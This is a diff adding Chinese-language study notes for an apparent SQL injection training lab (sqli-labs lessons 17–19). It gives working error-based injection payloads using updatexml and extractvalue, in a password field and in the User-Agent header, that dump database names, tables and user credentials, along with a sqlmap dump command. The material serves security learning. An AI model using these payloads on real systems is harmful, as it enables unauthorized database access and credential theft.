@@ -224,3 +224,45 @@ sqlmap -r less16.txt -p uname --technique=T -D security -T users --dump --batch
 -D security -T users --dump
 ```
 ## 17修改密码
+1.必须要有一个真实的用户名，然后password里面写
+爆库
+```
+1' and updatexml(1,concat(0x7e,database(),0x7e),1)#```
+```
+updatexml （占位，注入，占位）第二个参数要求是合法的 XPath 路径。 我们故意把查询到的库名塞进去，它不是合法路径，MySQL 就报错，并且把这个非法内容打印到页面上。
+爆表
+```
+1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)#
+```
+字段
+```
+1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),0x7e),1)#
+```
+mysql不允许边改表边查表，所以我们查询时候得给他加一些东西```
+select concat(username,0x3a,password) from (select * from users) as t  先读表，把表放t```
+## 18user-agent头注入（用户代理）
+http请求头
+1.Host指定目标服务器域名；
+2**Content-Type** 告诉服务器，请求体是什么格式。
+3.**Cookie** 存放会话、身份凭证（sessionid、登录凭证），44
+4.**Referer** 代表你从哪个页面跳转过来的
+5**Accept** 客户端能接收什么类型的响应数据
+6.**Content-Length** 请求体（POST 数据）的字节长度，Burp repeater 经常踩坑的头，写错会解析异常。
+这个题是改ua头的，把user-agent后面改为```
+User-Agent: test' and extractvalue(1,concat(0x7e,database(),0x7e)) and '1'='1```
+爆表
+```
+User-Agent: test' and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e)) and '1'='1
+```
+字段```
+User-Agent: test' and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1),0x7e)) and '1'='1```
+读取
+```
+User-Agent: test' and extractvalue(1,concat(0x7e,(select concat(username,0x7e,password) from users limit 0,1),0x7e)) and '1'='1
+```
+```
+extractvalue(XML文档, XPath路径)
+```
+用的依旧是xpath不合法打印
+## 19.修稿refer头文件
+20.
